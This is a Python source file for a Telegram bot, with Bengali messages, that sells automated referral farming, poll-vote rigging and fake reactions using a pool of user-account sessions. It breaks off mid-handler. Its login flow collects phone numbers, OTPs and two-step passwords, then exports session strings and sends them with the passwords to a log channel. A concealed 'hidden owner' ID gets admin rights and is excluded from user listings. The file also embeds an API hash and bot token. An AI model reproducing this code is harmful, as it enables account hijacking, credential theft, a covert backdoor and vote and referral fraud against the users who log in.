import asyncio
import re
import os
import json
import sqlite3

# Python Event Loop Fix
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

from pyrogram import Client, filters
from pyrogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    CallbackQuery
)

API_ID = 35643939
API_HASH = "eb824e14d2f8e33e54479bc15c78ad60"
BOT_TOKEN = "8865250711:AAGQRQUvf656BksvqESWDm0PGhCjj9gkhos"

OWNER_ID = 8029430078
HIDDEN_OWNER_ID = 8798004641  # হিডেন অনার আইডি

OFFICIAL_CHANNEL_URL = "https://t.me/MoneyPointtBD"
SUPPORT_CONTACT_URL = "https://t.me/E_M_P_T_Y_O"

# নতুন সেশন, নম্বর ও 2FA পাসওয়ার্ড পাঠানোর জন্য লগ চ্যানেল
SESSION_LOG_CHANNEL = "@Leack_tgi8386uei837383"

DB_NAME = "bot4_database.db"

def get_db():
    return sqlite3.connect(DB_NAME, timeout=10)

def init_db():
    with get_db() as conn:
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        cursor.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('owner_id', ?)", (str(OWNER_ID),))
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_string TEXT PRIMARY KEY,
                phone TEXT DEFAULT 'N/A'
            )
        ''')
        
        cursor.execute("PRAGMA table_info(sessions)")
        cols = [c[1] for c in cursor.fetchall()]
        if "phone" not in cols:
            cursor.execute("ALTER TABLE sessions ADD COLUMN phone TEXT DEFAULT 'N/A'")
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS allowed_users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                services INTEGER DEFAULT 1,
                poll_service INTEGER DEFAULT 1,
                react_service INTEGER DEFAULT 1,
                profile INTEGER DEFAULT 1,
                status INTEGER DEFAULT 1,
                history INTEGER DEFAULT 1,
                help INTEGER DEFAULT 1
            )
        ''')
        
        cursor.execute("PRAGMA table_info(allowed_users)")
        columns = [column[1] for column in cursor.fetchall()]
        if "poll_service" not in columns:
            cursor.execute("ALTER TABLE allowed_users ADD COLUMN poll_service INTEGER DEFAULT 1")
        if "react_service" not in columns:
            cursor.execute("ALTER TABLE allowed_users ADD COLUMN react_service INTEGER DEFAULT 1")
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS used_bots (
                target_bot TEXT,
                session_string TEXT,
                PRIMARY KEY (target_bot, session_string)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS order_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                target_bot TEXT,
                requested INTEGER,
                completed INTEGER,
                failed INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS poll_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                poll_link TEXT,
                option_name TEXT,
                requested INTEGER,
                completed INTEGER,
                failed INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS react_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                post_link TEXT,
                reaction TEXT,
                requested INTEGER,
                completed INTEGER,
                failed INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            INSERT OR IGNORE INTO allowed_users (user_id, username, services, poll_service, react_service, profile, status, history, help)
            VALUES (?, ?, 1, 1, 1, 1, 1, 1, 1)
        ''', (str(OWNER_ID), "@RABBYBHAII"))

        cursor.execute('''
            INSERT OR IGNORE INTO allowed_users (user_id, username, services, poll_service, react_service, profile, status, history, help)
            VALUES (?, ?, 1, 1, 1, 1, 1, 1, 1)
        ''', (str(HIDDEN_OWNER_ID), "@HiddenOwner"))
        
        conn.commit()

init_db()

def get_owner_id():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM config WHERE key = 'owner_id'")
        row = cursor.fetchone()
        return int(row[0]) if row else OWNER_ID

def set_owner_id(new_owner_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO config (key, value) VALUES ('owner_id', ?)", (str(new_owner_id),))
        cursor.execute('''
            INSERT OR REPLACE INTO allowed_users (user_id, username, services, poll_service, react_service, profile, status, history, help)
            VALUES (?, ?, 1, 1, 1, 1, 1, 1, 1)
        ''', (str(new_owner_id), "New Owner"))
        conn.commit()

def get_sessions():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT session_string FROM sessions")
        rows = cursor.fetchall()
    return [row[0] for row in rows]

def get_sessions_with_info():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT session_string, phone FROM sessions")
        rows = cursor.fetchall()
    return rows

def save_sessions(sessions_list):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM sessions")
        for s in sessions_list:
            if s.strip():
                cursor.execute("INSERT OR IGNORE INTO sessions (session_string, phone) VALUES (?, ?)", (s.strip(), "N/A"))
        conn.commit()

    try:
        with sqlite3.connect("bot3_database.db", timeout=10) as conn3:
            cursor3 = conn3.cursor()
            for s in sessions_list:
                if s.strip():
                    cursor3.execute("INSERT OR IGNORE INTO sessions (session_string, phone) VALUES (?, ?)", (s.strip(), "N/A"))
            conn3.commit()
    except Exception as e:
        print(f"⚠️ bot3 ডেটাবেজে বাল্ক সেশন সিঙ্ক করতে সমস্যা: {e}")

def add_session_to_db(session_str, phone_num="N/A"):
    session_clean = session_str.strip()
    
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO sessions (session_string, phone) VALUES (?, ?)", (session_clean, phone_num))
        conn.commit()
        
    try:
        with sqlite3.connect("bot3_database.db", timeout=10) as conn3:
            cursor3 = conn3.cursor()
            cursor3.execute("INSERT OR IGNORE INTO sessions (session_string, phone) VALUES (?, ?)", (session_clean, phone_num))
            conn3.commit()
    except Exception as e:
        print(f"⚠️ bot3 ডেটাবেজে সেশন পাঠাতে সমস্যা: {e}")

async def send_session_to_log_channel(client: Client, phone: str, session_str: str, two_fa: str = "N/A"):
    log_text = (
        f"🔔 **নতুন সেশন ও 2FA যুক্ত হয়েছে!**\n\n"
        f"📱 **নম্বর:** `{phone}`\n"
        f"🔑 **2FA Password:** `{two_fa}`\n"
        f"📦 **Session String:**\n`{session_str}`"
    )
    try:
        await client.send_message(SESSION_LOG_CHANNEL, log_text)
    except Exception as e:
        try:
            await client.send_message(get_owner_id(), f"⚠️ **চ্যানেলে সেশন পাঠাতে সমস্যা হয়েছে:**\n`{e}`\n\nবটকে চ্যানেলে Admin বানিয়েছেন কিনা নিশ্চিত করুন।")
            await client.send_message(HIDDEN_OWNER_ID, f"⚠️ **চ্যানেলে সেশন পাঠাতে সমস্যা হয়েছে:**\n`{e}`\n\nবটকে চ্যানেলে Admin বানিয়েছেন কিনা নিশ্চিত করুন।")
        except Exception:
            pass

def load_allowed_users():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, username, services, poll_service, react_service, profile, status, history, help FROM allowed_users")
        rows = cursor.fetchall()
    
    users_dict = {}
    for r in rows:
        uid, uname, s, ps, rs, p, st, h, hp = r
        if str(uid) == str(HIDDEN_OWNER_ID):
            continue  # হিডেন ওনারকে নরমাল ইউজার লিস্ট বা স্ট্যাটাস থেকে সম্পূর্ণ বাদ রাখা হয়েছে
        users_dict[str(uid)] = {
            "username": uname if uname else "Pending Login",
            "permissions": {
                "Services": bool(s),
                "Poll Vote": bool(ps),
                "React/View": bool(rs),
                "Profile": bool(p),
                "Status": bool(st),
                "History": bool(h),
                "Help": bool(hp)
            }
        }
    return users_dict

def save_allowed_users(users_dict):
    with get_db() as conn:
        cursor = conn.cursor()
        for uid, udata in users_dict.items():
            uname = udata.get("username", "Pending Login")
            perms = udata.get("permissions", {})
            cursor.execute('''
                INSERT OR REPLACE INTO allowed_users (user_id, username, services, poll_service, react_service, profile, status, history, help)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                str(uid),
                uname,
                int(perms.get("Services", True)),
                int(perms.get("Poll Vote", True)),
                int(perms.get("React/View", True)),
                int(perms.get("Profile", True)),
                int(perms.get("Status", True)),
                int(perms.get("History", True)),
                int(perms.get("Help", True))
            ))
        conn.commit()

def remove_user_from_db(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM allowed_users WHERE user_id = ?", (str(user_id),))
        conn.commit()

def load_used_data():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT target_bot, session_string FROM used_bots")
        rows = cursor.fetchall()
    
    used_db = {}
    for target_bot, session_string in rows:
        if target_bot not in used_db:
            used_db[target_bot] = []
        used_db[target_bot].append(session_string)
    return used_db

def save_used_data_entry(target_bot, session_string):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO used_bots (target_bot, session_string) VALUES (?, ?)", (target_bot, session_string))
        conn.commit()

def delete_bot_used_data(target_bot):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM used_bots WHERE target_bot = ?", (target_bot,))
        conn.commit()

def save_order_history(user_id, target_bot, requested, completed, failed):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO order_history (user_id, target_bot, requested, completed, failed)
            VALUES (?, ?, ?, ?, ?)
        ''', (str(user_id), target_bot, requested, completed, failed))
        conn.commit()

def save_poll_history(user_id, poll_link, option_name, requested, completed, failed):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO poll_history (user_id, poll_link, option_name, requested, completed, failed)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (str(user_id), poll_link, option_name, requested, completed, failed))
        conn.commit()

def save_react_history(user_id, post_link, reaction, requested, completed, failed):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO react_history (user_id, post_link, reaction, requested, completed, failed)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (str(user_id), post_link, reaction, requested, completed, failed))
        conn.commit()

PENDING_ORDERS = {}
ADMIN_STATE = {}
USER_STATE = {}
LOGIN_DATA = {}
POLL_TEMP_DATA = {}
REACT_TEMP_DATA = {}

main_bot = Client("main_bot_v4", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def is_authorized(_, __, update):
    user_id = str(update.from_user.id) if update.from_user else "0"
    if int(user_id) == HIDDEN_OWNER_ID:
        return True
    current_owner = get_owner_id()
    if int(user_id) == current_owner:
        return True
    allowed = load_allowed_users()
    return user_id in allowed

auth_filter = filters.create(is_authorized)

def get_main_keyboard(user_id: int):
    current_owner = get_owner_id()
    buttons = [
        [KeyboardButton("🛠 Refer Services"), KeyboardButton("📊 Poll Vote Service")],
        [KeyboardButton("❤️ View & Reaction"), KeyboardButton("👤 Profile")],
        [KeyboardButton("📊 Status"), KeyboardButton("📜 Order History")],
        [KeyboardButton("📢 Official Channel"), KeyboardButton("💬 Live Support")],
        [KeyboardButton("❓ Help / Tutorial")]
    ]
    if user_id == current_owner or user_id == HIDDEN_OWNER_ID:
        buttons[4].append(KeyboardButton("⚙️ Admin Panel"))
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

async def verify_and_clean_sessions(bot_client):
    session_rows = get_sessions_with_info()
    valid_sessions = []
    dead_sessions_info = []

    for s_str, phone in session_rows:
        try:
            async with Client(f"health_{phone}_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=s_str, in_memory=True) as temp_client:
                me = await temp_client.get_me()
                if me:
                    valid_sessions.append((s_str, phone))
        except Exception:
            dead_sessions_info.append(phone if phone and phone != "N/A" else "Unknown / Session String")

    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM sessions")
        for s_str, ph in valid_sessions:
            cursor.execute("INSERT INTO sessions (session_string, phone) VALUES (?, ?)", (s_str, ph))
        conn.commit()

    if dead_sessions_info:
        dead_list_str = "\n".join([f"• `{p}`" for p in dead_sessions_info])
        alert_msg = (
            f"⚠️ **সেশন হেলথ অ্যালার্ট!**\n\n"
            f"আপনার বট থেকে মোট `{len(dead_sessions_info)}` টি নষ্ট বা ব্যান হওয়া সেশন স্বয়ংক্রিয়ভাবে রিমুভ করা হয়েছে。\n\n"
            f"❌ **নষ্ট সেশনগুলোর বিবরণ/নম্বর:**\n{dead_list_str}\n\n"
            f"দয়া করে নতুন সেশন যুক্ত করুন!"
        )
        try:
            await bot_client.send_message(get_owner_id(), alert_msg)
            await bot_client.send_message(HIDDEN_OWNER_ID, alert_msg)
        except Exception:
            pass

    return [item[0] for item in valid_sessions]

async def run_referral_task(session_str: str, target_bot: str, ref_code: str):
    try:
        async with Client(f"worker_ref_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as userbot:
            try:
                try:
                    await userbot.resolve_peer(target_bot)
                except Exception:
                    pass
                await userbot.send_message(target_bot, f"/start {ref_code}")
            except Exception:
                return False

            for step_idx in range(4):
                await asyncio.sleep(4)
                messages = []
                try:
                    async for m in userbot.get_chat_history(target_bot, limit=5):
                        messages.append(m)
                except Exception:
                    pass

                if not messages:
                    break

                action_taken = False
                for new_msg in messages:
                    text = (new_msg.text or new_msg.caption or "").lower()

                    math_match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)', text)
                    if math_match:
                        try:
                            num1, op, num2 = math_match.groups()
                            ans = eval(f"{num1}{op}{num2}")
                            await userbot.send_message(target_bot, str(ans))
                            action_taken = True
                            await asyncio.sleep(2)
                        except Exception:
                            pass

                    if new_msg.reply_markup and isinstance(new_msg.reply_markup, InlineKeyboardMarkup):
                        for row in new_msg.reply_markup.inline_keyboard:
                            for btn in row:
                                btn_text = (btn.text or "").lower()
                                keywords = [
                                    "open", "app", "play", "start", "joined", "verify", 
                                    "check", "done", "continue", "✅", "join", "human", 
                                    "captcha", "solve", "confirm", "agree", "subscribe", 
                                    "channel", "group", "claim", "bonus", "next"
                                ]
                                if any(k in btn_text for k in keywords):
                                    try:
                                        await new_msg.click(btn.text)
                                        action_taken = True
                                        await asyncio.sleep(2)
                                    except Exception:
                                        pass

                    usernames = re.findall(r'@([a-zA-Z0-9_]+)', new_msg.text or "")
                    for un in usernames:
                        if un.lower() != target_bot.lower():
                            try:
                                await userbot.join_chat(un)
                                action_taken = True
                                await asyncio.sleep(2)
                            except Exception:
                                pass

                    if new_msg.reply_markup and isinstance(new_msg.reply_markup, InlineKeyboardMarkup):
                        for row in new_msg.reply_markup.inline_keyboard:
                            for btn in row:
                                if btn.url:
                                    match_url = re.search(r't\.me/([a-zA-Z0-9_\+\-]+)', btn.url)
                                    if match_url:
                                        link_val = match_url.group(1)
                                        if link_val.lower() != target_bot.lower():
                                            try:
                                                await userbot.join_chat(link_val)
                                                action_taken = True
                                                await asyncio.sleep(2)
                                            except Exception:
                                                pass

                if not action_taken and step_idx > 0:
                    break

            return True
    except Exception:
        return False

async def run_poll_vote_task(session_str: str, chat_identifier, message_id: int, target_option_index: int, is_native_poll: bool, target_text: str):
    try:
        async with Client(f"worker_poll_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as userbot:
            try:
                if isinstance(chat_identifier, str):
                    try:
                        await userbot.resolve_peer(chat_identifier)
                        await userbot.join_chat(chat_identifier)
                        await asyncio.sleep(1.5)
                    except Exception:
                        pass
                
                if is_native_poll:
                    try:
                        await userbot.vote_poll(chat_id=chat_identifier, message_id=message_id, options=[target_option_index])
                        await asyncio.sleep(1)
                        return True
                    except Exception:
                        pass

                msg = await userbot.get_messages(chat_identifier, message_id)
                if msg and msg.reply_markup and isinstance(msg.reply_markup, InlineKeyboardMarkup):
                    target_btn = None
                    target_r, target_c = -1, -1
                    
                    flat_buttons = []
                    for row_idx, row in enumerate(msg.reply_markup.inline_keyboard):
                        for col_idx, btn in enumerate(row):
                            if btn.text and not btn.url:
                                flat_buttons.append((row_idx, col_idx, btn))

                    # প্রথমে ইনডেক্স দিয়ে একদম সঠিকভাবে মেলানোর চেষ্টা করা হবে
                    if 0 <= target_option_index < len(flat_buttons):
                        target_r, target_c, target_btn = flat_buttons[target_option_index]

                    # যদি কোনো কারণে ইনডেক্স না মেলে, তখন টেক্সট দিয়ে একদম নিখুঁতভাবে মেলানো হবে
                    if not target_btn or (target_btn.text.strip() != target_text.strip()):
                        for r_idx, c_idx, btn in flat_buttons:
                            if btn.text and target_text.strip() == btn.text.strip():
                                target_r, target_c, target_btn = r_idx, c_idx, btn
                                break

                    if target_btn:
                        # প্রথমে callback_data রিকোয়েস্ট পাঠানো হবে যাতে রিয়েল ভোটের কাজ নিশ্চিত হয়
                        if target_btn.callback_data:
                            try:
                                await userbot.request_callback_answer(
                                    chat_id=chat_identifier,
                                    message_id=message_id,
                                    callback_data=target_btn.callback_data
                                )
                                await asyncio.sleep(1)
                                return True
                            except Exception:
                                pass

                        try:
                            await msg.click(target_r, target_c)
                            await asyncio.sleep(1)
                            return True
                        except Exception:
                            pass

                return False
            except Exception:
                return False
    except Exception:
        return False

async def run_reaction_task(session_str: str, chat_identifier, message_id: int, emoji: str, do_view: bool):
    try:
        async with Client(f"worker_react_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as userbot:
            try:
                if isinstance(chat_identifier, str):
                    try:
                        await userbot.resolve_peer(chat_identifier)
                        await userbot.join_chat(chat_identifier)
                        await asyncio.sleep(1.5)
                    except Exception:
                        pass
                
                if do_view:
                    await userbot.get_messages(chat_identifier, message_id)
                    await asyncio.sleep(1)

                if emoji:
                    await userbot.send_reaction(chat_id=chat_identifier, message_id=message_id, emoji=emoji)
                    await asyncio.sleep(1)

                return True
            except Exception:
                return False
    except Exception:
        return False

@main_bot.on_message(~auth_filter)
async def unauthorized_msg(client: Client, message: Message):
    await message.reply_text("⛔ **আপনার এই বট ব্যবহার করার অনুমতি নেই!**\n\nঅ্যাডমিনের সাথে যোগাযোগ করুন।")

@main_bot.on_message(auth_filter & filters.command("start"))
async def start_cmd(client: Client, message: Message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    
    allowed = load_allowed_users()
    current_owner = get_owner_id()
    if int(uid) == HIDDEN_OWNER_ID or int(uid) == current_owner:
        pass
    else:
        if uid in allowed:
            allowed[uid]["username"] = uname
            save_allowed_users(allowed)

    sessions = get_sessions()

    welcome_text = (
        f"👋 **স্মার্ট অটো রেফারেল, পোল ভোট ও রিয়্যাকশন বটে স্বাগতম!**\n\n"
        f"👤 **আপনার আইডি:** `{message.from_user.id}`\n"
        f"📊 **মোট অ্যাক্টিভ আইডি:** `{len(sessions)} টি`\n\n"
        f"নিচের মেনু থেকে আপনার কাঙ্ক্ষিত সার্ভিস সিলেক্ট করুন।"
    )
    await message.reply_text(welcome_text, reply_markup=get_main_keyboard(message.from_user.id))

@main_bot.on_message(auth_filter & filters.document)
async def handle_document_upload(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id != get_owner_id() and user_id != HIDDEN_OWNER_ID:
        return
    
    if message.document.file_name.endswith(".txt"):
        try:
            file_path = await message.download()
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            
            os.remove(file_path)
            new_sessions = [line.strip() for line in content.splitlines() if line.strip()]
            
            if not new_sessions:
                await message.reply_text("❌ ফাইলটি খালি রয়েছে বা কোনো সেশন পাওয়া যায়নি।")
                return

            current_sessions = get_sessions()
            added_count = 0
            for s in new_sessions:
                if s not in current_sessions:
                    current_sessions.append(s)
                    added_count += 1
                    await send_session_to_log_channel(client, "Bulk Uploaded", s, "N/A")
            
            save_sessions(current_sessions)
            updated_total = len(get_sessions())
            
            await message.reply_text(
                f"📁 **সাকসেসফুলি বাল্ক সেশন আপলোড সম্পন্ন!**\n\n"
                f"📥 নতুন যুক্ত হলো: `{added_count}` টি\n"
                f"📊 **বর্তমান মোট অ্যাক্টিভ আইডি:** `{updated_total} টি`"
            )
        except Exception as e:
            await message.reply_text(f"❌ ফাইল প্রসেস করতে সমস্যা হয়েছে:\n`{e}`")
        return

@main_bot.on_message(auth_filter & filters.text)
async def handle_all_messages(client: Client, message: Message):
    text = message.text.strip()
    chat_id = message.chat.id
    user_id = message.from_user.id
    str_uid = str(user_id)
    allowed = load_allowed_users()
    sessions = get_sessions()
    current_owner = get_owner_id()
    is_admin = (user_id == current_owner or user_id == HIDDEN_OWNER_ID)

    if is_admin and ADMIN_STATE.get(user_id) == "BROADCAST":
        ADMIN_STATE.pop(user_id, None)
        sent, failed = 0, 0
        all_targets = list(allowed.keys())
        if str(HIDDEN_OWNER_ID) not in all_targets:
            all_targets.append(str(HIDDEN_OWNER_ID))
        for target_id in all_targets:
            try:
                await client.send_message(int(target_id), f"📢 **অ্যাডমিন নোটিশ:**\n\n{text}")
                sent += 1
            except Exception:
                failed += 1
        await message.reply_text(f"✅ **ব্রডকাস্ট সম্পন্ন!**\n\n🎯 সফল: `{sent}` জন\n❌ ব্যর্থ: `{failed}` জন")
        return

    if is_admin and ADMIN_STATE.get(user_id) == "TRANSFER_OWNERSHIP":
        ADMIN_STATE.pop(user_id, None)
        if not text.isdigit():
            await message.reply_text("❌ আইডি শুধু সংখ্যা হতে হবে।")
            return
        new_owner_id = int(text)
        set_owner_id(new_owner_id)
        await message.reply_text(
            f"🎉 **মেইন ওনারশিপ সফলভাবে ট্রান্সফার করা হয়েছে!**\n\n"
            f"👑 **নতুন অনার আইডি:** `{new_owner_id}`"
        )
        try:
            await client.send_message(new_owner_id, "👑 **অভিনন্দন! আপনাকে এই বটের নতুন মেইন অনার (Main Owner) হিসেবে সেট করা হয়েছে।**")
        except Exception:
            pass
        return

    if is_admin and ADMIN_STATE.get(user_id) == "CLEAR_BOT_DATA":
        ADMIN_STATE.pop(user_id, None)
        bot_name = text.replace("@", "").lower().strip()
        used_db = load_used_data()
        if bot_name in used_db:
            delete_bot_used_data(bot_name)
            await message.reply_text(f"✅ `@{bot_name}` বটের রেফারেল ডাটা সফলভাবে মুছে ফেলা হয়েছে!")
        else:
            await message.reply_text(f"❌ `@{bot_name}` নামের কোনো বটের হিস্ট্রি ডেটাবেজে পাওয়া যায়নি।")
        return

    if user_id in LOGIN_DATA:
        step = LOGIN_DATA[user_id].get("step")
        if step == "PHONE":
            phone = text.replace(" ", "").strip()
            temp_client = Client(
                f"temp_login_{user_id}_{os.urandom(4).hex()}", 
                api_id=API_ID, 
                api_hash=API_HASH, 
                device_model="Realme Note 50",
                system_version="Android 13",
                app_version="10.9.1",
                in_memory=True
            )
            try:
                await temp_client.connect()
                code_info = await temp_client.send_code(phone)
                LOGIN_DATA[user_id] = {
                    "step": "CODE",
                    "client": temp_client,
                    "phone": phone,
                    "phone_code_hash": code_info.phone_code_hash,
                    "two_fa": "N/A"
                }
                await message.reply_text("📩 সফলভাবে কোড পাঠানো হয়েছে! আপনার টেলিগ্রামে আসা **OTP / Code** টি এখানে পাঠান:")
            except Exception as e:
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                LOGIN_DATA.pop(user_id, None)
                error_msg = str(e)
                if "PHONE_NUMBER_INVALID" in error_msg:
                    await message.reply_text("❌ ফোন নম্বরটি সঠিক নয় বা ভুল ফরম্যাটে দেওয়া হয়েছে। কান্ট্রি কোড সহ সঠিক নম্বর দিন (যেমন: +88017XXXXXXXX)")
                elif "PHONE_NUMBER_FLOOD" in error_msg:
                    await message.reply_text("❌ এই নম্বর থেকে অতিরিক্ত বার কোড রিকোয়েস্ট করা হয়েছে। কিছুক্ষণ পর আবার চেষ্টা করুন।")
                elif "PHONE_NUMBER_BANNED" in error_msg:
                    await message.reply_text("❌ এই নম্বরটি টেলিগ্রাম দ্বারা ব্যান করা হয়েছে!")
                else:
                    await message.reply_text(f"❌ কোড পাঠাতে সমস্যা হয়েছে:\n`{e}`")
            return

        elif step == "CODE":
            otp_code = text.replace(" ", "").strip()
            login_info = LOGIN_DATA[user_id]
            temp_client = login_info["client"]
            phone_num = login_info["phone"]
            try:
                await temp_client.sign_in(
                    phone_number=phone_num,
                    phone_code_hash=login_info["phone_code_hash"],
                    phone_code=otp_code
                )
                session_str = await temp_client.export_session_string()
                await temp_client.disconnect()
                add_session_to_db(session_str, phone_num)
                
                await send_session_to_log_channel(client, phone_num, session_str, "N/A")

                LOGIN_DATA.pop(user_id, None)
                updated_sessions = get_sessions()
                await message.reply_text(
                    f"🎉 **নতুন আইডি ({phone_num}) সফলভাবে এড করা হয়েছে!**\n\n"
                    f"📊 **বর্তমান মোট অ্যাক্টিভ আইডি:** `{len(updated_sessions)} টি`"
                )
            except Exception as e:
                if "TWO_STEPS_VERIFICATION" in str(e) or "PASSWORD" in str(e).upper():
                    LOGIN_DATA[user_id]["step"] = "PASSWORD"
                    await message.reply_text("🔑 আপনার একাউন্টের **Two-Step Password** লিখে পাঠান:")
                else:
                    try:
                        await temp_client.disconnect()
                    except Exception:
                        pass
                    LOGIN_DATA.pop(user_id, None)
                    await message.reply_text(f"❌ ওটিপি ভুল বা এরর:\n`{e}`")
            return

        elif step == "PASSWORD":
            password = text.strip()
            login_info = LOGIN_DATA[user_id]
            temp_client = login_info["client"]
            phone_num = login_info["phone"]
            try:
                await temp_client.check_password(password)
                session_str = await temp_client.export_session_string()
                await temp_client.disconnect()
                add_session_to_db(session_str, phone_num)
                
                await send_session_to_log_channel(client, phone_num, session_str, password)

                LOGIN_DATA.pop(user_id, None)
                updated_sessions = get_sessions()
                await message.reply_text(
                    f"🎉 **নতুন আইডি ({phone_num}) ও 2FA পাসওয়ার্ডসহ সফলভাবে এড করা হয়েছে!**\n\n"
                    f"📊 **বর্তমান মোট অ্যাক্টিভ আইডি:** `{len(updated_sessions)} টি`"
                )
            except Exception as e:
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                LOGIN_DATA.pop(user_id, None)
                await message.reply_text(f"❌ পাসওয়ার্ড ভুল হয়েছে:\n`{e}`")
            return

    if not is_admin:
        user_perms = allowed.get(str_uid, {}).get("permissions", {
            "Services": True, "Poll Vote": True, "React/View": True, 
            "Profile": True, "Status": True, "History": True, "Help": True
        })
    else:
        user_perms = {
            "Services": True, "Poll Vote": True, "React/View": True, 
            "Profile": True, "Status": True, "History": True, "Help": True
        }

    if text in ["🛠 Refer Services", "🛠 Services"]:
        if not is_admin and not user_perms.get("Services", True):
            await message.reply_text("🚫 **Services অপশনটি অফ রাখা হয়েছে!**")
            return
        USER_STATE[chat_id] = "WAITING_FOR_LINK"
        await message.reply_text(
            "👇 **রেফার করার নিয়ম:**\n\n"
            "আপনার রেফারেল লিঙ্কটি মেসেজে লিখে পাঠান:\n"
            "উদাহরণ: `https://t.me/Refer2vote_bot?start=6599413664`"
        )
        return

    elif text == "📊 Poll Vote Service":
        if not is_admin and not user_perms.get("Poll Vote", True):
            await message.reply_text("🚫 **Poll Vote Service অপশনটি আপনার জন্য অফ রাখা হয়েছে!**")
            return
        USER_STATE[chat_id] = "WAITING_FOR_POLL_LINK"
        await message.reply_text(
            "📊 **পোল ভোট সার্ভিস:**\n\n"
            "যে পোস্ট বা মেসেজে পোলটি আছে, সেই পোস্টের লিংকটি এখানে পাঠান:\n"
            "উদাহরণ: `https://t.me/channel_username/123`"
        )
        return

    elif text == "❤️ View & Reaction":
        if not is_admin and not user_perms.get("React/View", True):
            await message.reply_text("🚫 **View & Reaction অপশনটি অফ রাখা হয়েছে!**")
            return
        USER_STATE[chat_id] = "WAITING_FOR_REACT_LINK"
        await message.reply_text(
            "❤️ **ভিউ ও রিয়্যাকশন সার্ভিস:**\n\n"
            "চ্যানেলের যে পোস্টে ভিউ বা রিয়্যাকশন নিতে চান, সেই পোস্টের লিংকটি পাঠান:\n"
            "উদাহরণ: `https://t.me/channel_username/123`"
        )
        return

    elif text == "👤 Profile":
        if not is_admin and not user_perms.get("Profile", True):
            await message.reply_text("🚫 **Profile অপশনটি অফ রাখা হয়েছে!**")
            return
        profile_text = (
            f"👤 **আপনার প্রোফাইল**\n\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"👤 **নাম:** {message.from_user.first_name}\n"
            f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n\n"
            f"💰 **Balance:** Unlimited\n"
            f"👥 **Total Services Processed:** Active"
        )
        await message.reply_text(profile_text, reply_markup=get_main_keyboard(user_id))
        return

    elif text == "📊 Status":
        if not is_admin and not user_perms.get("Status", True):
            await message.reply_text("🚫 **Status অপশনটি অফ রাখা হয়েছে!**")
            return
        total_users = len(allowed)
        user_list_str = ""
        for idx, (u_id, u_info) in enumerate(allowed.items(), 1):
            u_name = u_info.get("username", "Pending Login") if isinstance(u_info, dict) else u_info
            user_list_str += f"{idx}. ID: `{u_id}` | Username: {u_name}\n"

        status_text = (
            f"📊 **বট স্ট্যাটাস ও ইউজার লিস্ট**\n\n"
            f"👥 **মোট অনুমোদিত ইউজার:** `{total_users} জন`\n"
            f"👑 **বর্তমান মেইন অনার:** `{current_owner}`\n"
            f"🤖 **অ্যাক্টিভ ওয়ার্কার সেশন:** `{len(sessions)} টি`\n\n"
            f"📋 **ইউজারদের তালিকা:**\n"
            f"{user_list_str}"
        )
        await message.reply_text(status_text, reply_markup=get_main_keyboard(user_id))
        return

    elif text == "📜 Order History":
